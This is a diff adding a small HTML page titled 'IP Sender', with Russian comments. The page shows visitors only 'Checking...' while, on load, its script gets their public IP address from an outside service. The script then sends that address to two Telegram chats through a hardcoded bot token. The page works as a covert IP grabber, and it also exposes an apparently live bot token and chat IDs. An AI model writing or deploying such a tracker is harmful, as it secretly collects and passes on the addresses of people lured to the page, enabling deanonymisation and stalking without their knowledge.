@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>IP Sender</title>
+</head>
+<body>
+<h2>Checking...</h2>
+
+<script>
+const BOT_TOKEN = "8397835616:AAEx9jaaydmILMcmMMqeRablvQcCgaI6Dbo";      // вставь сюда токен бота
+const CHAT_ID = "2026562188";      // твоё ID (от @userinfobot)
+const CHAT_ID2 = "8438178673";
+
+async function sendToTelegram(ip, chat_id) {
+    const text = "Зашел новый пользователь с IP: " + ip;
+
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: chat_id,
+            text: text
+        })
+    });
+}
+
+async function getIP() {
+    try {
+        const response = await fetch("https://api.ipify.org?format=json");
+        const data = await response.json();
+        await sendToTelegram(data.ip, CHAT_ID);
+        await sendToTelegram(data.ip, CHAT_ID2);
+        document.body.innerHTML = "<h1>Done</h1>";
+    } catch (e) {
+        document.body.innerHTML = "<h1>Error: " + e + "</h1>";
+    }
+}
+
+getIP();
+</script>
+</body>
+</html>
+
